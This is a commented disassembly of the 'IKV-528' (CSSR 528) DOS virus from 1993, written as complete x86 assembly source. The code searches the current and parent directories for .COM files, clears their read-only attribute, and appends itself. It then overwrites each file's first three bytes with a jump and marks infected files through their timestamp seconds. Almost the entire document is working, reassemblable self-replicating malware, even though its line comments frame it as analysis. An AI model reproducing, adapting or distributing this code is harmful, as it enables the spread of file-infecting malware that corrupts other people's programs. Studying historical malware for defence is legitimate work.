;**************************************************************************
;**                                                                      **
;**                    IKV-528.ASM - CSSR 528                            **
;**                                                                      **
;**      DATE: 15-APR-93                                                 **
;**      Dissasembled, Analysed & Commented by: Kohntark                 **
;**                                                                      **
;**************************************************************************

PROGRAM         SEGMENT
                ASSUME  cs:PROGRAM, ds:PROGRAM

                ORG  100h

IKV_528         PROC  FAR

START:
                jmp     VIRUS                   ;(04E8)
                db      997 dup (0)             ;part of host file, total = 1000 bytes
VIRUS:

                push    ds                      ;ds in stack
                xor     ax,ax                   ;Zero register
                push    ax                      ;0 into stack
                mov     si,67Ah                 ;DATA offset
                mov     dx,si
                add     dx,4Ah                  ;add displacement (74d) dx=6C4h
                mov     ax,3D00h
                int     21h                     ;DOS Services  ah=function 3Dh
                                                ;open file, al=mode,name@ds:dx
                jnc     CHECK                   ;Jump if carry=0
                jmp     short RESTORE_HOST      ;(0536)
                nop

;****************************************************************************
; Check memory image against physical image (1st 3 bytes)
; if image is not the same display error message (!!!!!!)
;****************************************************************************

CHECK:
                mov     bx,ax                   ;file handle to bx
                mov     ah,3Fh                  ;int 21h ah function ->read file
                mov     cx,3                    ;# of bytes to read
                mov     dx,si                   ;put bytes read here
                add     dx,7Fh                  ;in data part  (127d) (in the heap)
                nop                             ;necessary pad to make v-size 528
                int     21h                     ;DOS Services  ah=function 3Fh
                                                ;read file, cx=bytes, to ds:dx
                jnc     CHECK2                  ;Jump if carry=0
                jmp     short RESTORE_HOST      ;(0536)
                nop

;***********************************************************************************
; Compare image in heap of file read to memory image of current host
;***********************************************************************************

CHECK2:
                cmp     ax,3                     ;???
                jne     RESTORE_HOST             ;Jump if not equal
                mov     bx,si                    ;DATA address into si=source
                add     si,7Fh                   ;add 127, point to heap
                nop
                mov     di,100h                 ;destination = beginnning of host
                cld                             ;Clear direction
                repe    cmpsb                   ;Rept zf=1+cx>0 Cmp [si] to es:[di]
                cmp     cx,0
                je      RESTORE_HOST            ;Jump if equal
                mov     dx,bx
                add     dx,57h                  ;dx points to MSG
                nop                             ;pad
                mov     ah,9
                int     21h                     ;DOS Services  ah=function 09h
                                                ;display char string at ds:dx
                mov     ah,1
                int     21h                     ;DOS Services  ah=function 01h
                                                ;get keybd char al, with echo

;*******************************************************************************
; Restore 1st 3 bytes to host file
;*******************************************************************************

RESTORE_HOST:
                mov     si,bx                   ;DATA address into si
                mov     dx,si                   ;si, dx points to FIRST_3_BYTES
                add     si,0                    ;si = pointer to 3 bytes to restore
                cld                             ;Clear direction flag
                mov     cx,3                    ;# of bytes
                mov     di,100h                 ;destination = beginning of COM file
                rep     movsb                   ;Rep while cx>0 Mov [si] to es:[di]

;************************************************************************************
; Set DTA to internal v-code
;************************************************************************************

                mov     di,dx
                mov     dx,2Ch                  ;dx = address of dta in v-code
                add     dx,di                   ;dx point to DTA,DATA + 44d
                mov     bx,dx
                mov     ah,1Ah
                int     21h                     ;DOS Services  ah=function 1Ah
                                                ;set DTA to ds:dx

;****************************************************************************
; Find a file to infect
;****************************************************************************

                mov     bp,0
                mov     dx,di                  ;DATA ADDRESS
                add     dx,7                   ;dx points to COMMASK
FIND_FIRST:
                mov     cx,3
                mov     ah,4Eh                  ;ah = function 4Eh
                int     21h                     ;DOS Services  ah=function 4Eh
                                                ;find 1st filenam match @ds:dx
                jmp     short CONTINUE1         ;(0569)
                nop
FIND_NEXT:
                mov     ah,4Fh                  ;ah = function 4Fh
                int     21h                     ;DOS Services  ah=function 4Fh
                                                ;find next filename match
CONTINUE1:
                jnc     FILE_FOUND              ;Jump if carry=0
                cmp     al,12h                  ;no more files?
                je      CONTINUE2               ;if no more files check...
                jmp     EXIT                    ;(066D)
CONTINUE2:
                cmp     bp,0FFFFh
                jne     CONTINUE3               ;Jump if not equal
                jmp     EXIT                    ;(066D)
CONTINUE3:
                dec     dx                      ;goto parent directory.. points to \
                mov     bp,0FFFFh
                jmp     short FIND_FIRST        ;(055B) look for more files
FILE_FOUND:
                mov     cl,[bx+16h]              ;22d
                and     cl,1Fh                   ;check time of found file
                cmp     cl,2                     ;to see if infected
                je      FIND_NEXT                ;Jump if equal
                cmp     word ptr [bx+1Ah],0FA00h ;if file size < 520 bytes don't infect
                ja      FIND_NEXT                ;Jump if above
                cmp     word ptr [bx+1Ah],100h
                jb      FIND_NEXT                ;Jump if below

                push    di                      ;save DATA address
                mov     si,bx                   ;
                add     si,1Eh                  ;source points to FNAME2
                add     di,14h                  ;destination points to FNAME1
                cmp     bp,0FFFFh
                jne     STORE_FILENAME          ; Jump if not equal
                mov     al,5Ch                  ;
                stosb                           ; Store al to es:[di]
STORE_FILENAME:
                lodsb                           ; String [si] to al
                stosb                           ; Store al to es:[di]
                cmp     al,0
                jne     STORE_FILENAME          ; Jump if not equal

;*********************************************************************************
; Get new found file's attributes
;*********************************************************************************

                pop     di                      ;restore DATA address
                mov     dx,di
                add     dx,14h                  ;dx points to FNAME1
                mov     ax,4300h
                int     21h                     ;DOS Services  ah=function 43h
                                                ;get/set file attrb, nam@ds:dx
                mov     [di+22h],cx             ;save files attributes DATA + 34d

;*********************************************************************************
; Set new found file's attributes
;*********************************************************************************

                and     cx,0FFFEh               ;set new attributes
                mov     dx,di
                add     dx,14h                  ;dx points to FNAME1
                mov     ax,4301h
                int     21h                     ;DOS Services  ah=function 43h
                                                ;get/set file attrb, nam@ds:dx

;*********************************************************************************
; Open new found file for I/O
;*********************************************************************************

                mov     dx,di
                add     dx,14h                  ;dx points to FNAME1
                mov     ax,3D02h
                int     21h                     ;DOS Services  ah=function 3Dh
                                                ;open file, al=mode,name@ds:dx
                jnc     GET_DATE_TIME           ;Jump if carry=0
                jmp     RESTORE_ATTRIB          ;(0665) error? restore attrib & exit

;*********************************************************************************
; Get & store the new file's date & time stamp
;*********************************************************************************

GET_DATE_TIME:
                mov     bx,ax                   ;file handle into bx
                mov     ax,5700h                ;ax=function 5700h
                int     21h                     ;get file date & time

                mov     [di+36d],cx             ;store date
                mov     [di+38d],dx             ;store time

;*********************************************************************************
; Read new found file's 1st 3 bytes
;*********************************************************************************

                mov     ah,3Fh                  ;ah=function 3Fh, read file
                mov     cx,3                    ;# of bytes to read
                mov     dx,di                   ;read to ds:dx
                add     dx,0                    ;dx points to beginning of DATA
                int     21h                     ;DOS Services

                jnc     DUMB_JUMP               ;Jump if carry=0
                jmp     short RESTORE_DATE_TIME ;(0650) problem? restore stuff & exit
                nop
DUMB_JUMP:
                cmp     ax,3                    ;check for ?
                jne     RESTORE_DATE_TIME       ;Jump if not equal

;*********************************************************************************
; Move PTR to the end of the file
;*********************************************************************************

                mov     ax,4202h                ;al= method = from end
                mov     cx,0                    ;cx,dx = displacement = 0
                mov     dx,cx
                int     21h                     ;DOS Services  ah=function 42h
                                                ;move file ptr, cx,dx=offset

;*********************************************************************************
; INFECTION
;*********************************************************************************

                sub     ax,3                   ;pad ax for jmp instruction size?
                mov     [di+4],ax              ;point to DATA + 4
                mov     cx,192h                ;add size of virus code (402)
                cmp     dx,0                   ;check for error
                jne     RESTORE_DATE_TIME      ;Jump if not equal
                mov     dx,di                  ;dx point to data
                sub     di,cx                  ;dx points to beginning of v-code
                add     di,5                   ;point to DATA offset mov instruction
                add     ax,103h                ;add 259d to ax
                add     ax,cx                  ;add v-code size to ax
                mov     [di],ax                ;put ax in v-code
                mov     ah,40h                 ;function ah = 40h
                mov     di,dx                  ;save address of DATA
                sub     dx,cx                  ;point to beginning of v-code
                mov     cx,210h                ;#of bytes to write -  528 bytes
                int     21h                     ;DOS Services  ah=function 40h
                                                ;write file cx=bytes, to ds:dx
                jnc     CONTINUE                ;Jump if carry=0
                jmp     short RESTORE_DATE_TIME ;(0650)
                nop

;*********************************************************************************
; Position PTR at the beginning of file
;*********************************************************************************

CONTINUE:
                cmp     ax,210h
                jne     RESTORE_DATE_TIME       ;Problem? restore stuff & quit
                mov     ax,4200h                ;al = 0 = method = beginning
                mov     cx,0                    ;cx,dx = 0 = displacement
                mov     dx,cx
                int     21h                     ;DOS Services  ah=function 42h
                                                ;move file ptr, cx,dx=offset
                jc      RESTORE_DATE_TIME       ;Jump if carry Set

;*********************************************************************************
; Write 1st 3 bytes to new infected file
;*********************************************************************************

                mov     ah,40h                  ;function ah = 40h
                mov     cx,3                    ;# of bytes to write
                mov     dx,di                   ;write from dx
                add     dx,3                    ;position of jmp code
                int     21h                     ;DOS Services  ah=function 40h
                                                ;write file cx=bytes, to ds:dx

;*********************************************************************************
; Restore the original date & time stamp
;*********************************************************************************

RESTORE_DATE_TIME:
                mov     cx,[di+36d]
                mov     dx,[di+38d]
                and     cx,0FFE0h               ;set seconds (INFECTION ID)
                or      cl,2
                mov     ax,5701h
                int     21h                     ;DOS Services  ah=function 57h
                                                ;set file date & time
;*********************************************************************************
; Close file handle
;*********************************************************************************

                mov     ah,3Eh                  ;function ah = 3E
                int     21h                     ;DOS Services  ah=function 3Eh
                                                ;close file, bx=file handle

;*********************************************************************************
; Restore the new file's old attributes
;*********************************************************************************

RESTORE_ATTRIB:
                mov     ax,4301h
                mov     cx,[di+16h]
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
EXIT:

;*********************************************************************************
; Set the DTA to original address
;*********************************************************************************

                mov     dx,80h
                mov     ah,1Ah
                int     21h                     ;DOS Services  ah=function 1Ah
                                                ;set DTA to ds:dx
                pop     ax
                mov     di,100h
                push    di                      ;set new return address in stack
                retn                            ;return to host
                int     20h                     ;Program Terminate

;**********************************************************************************
;OFFSET 67Ah = 1658. 1658 - 100h - 1000 (host size) = 402 = v-code size
;**********************************************************************************

DATA:

FIRST_3_BYTES   db      0, 0E9h, 0E5h, 3, 05Ch        ;'\'
COMMASK         db      '????????.COM',0
FNAME1          db      'IKV-528.COM',0,0,20h,0
TIME1           db      39h,0Bh
DATE1           db      0E2h,18h
                db      0,0,0,0, 1
DTA             db      '????????'                     ;DTA = 26 bytes
                db      'COM',3, 7, 0
                db      0, 0, 0, 0A3h, 9Eh
                db      0,20h,39h,0Bh, 0E2h, 18h
FSIZE           db      0E8h,3, 0, 0
FNAME2          db      'IKV-528.COM',0, 0
MSG             db      13d,'Warning : File is damaged by virus !!!'

IKV_528         ENDP

PROGRAM         ENDS

                END   START
                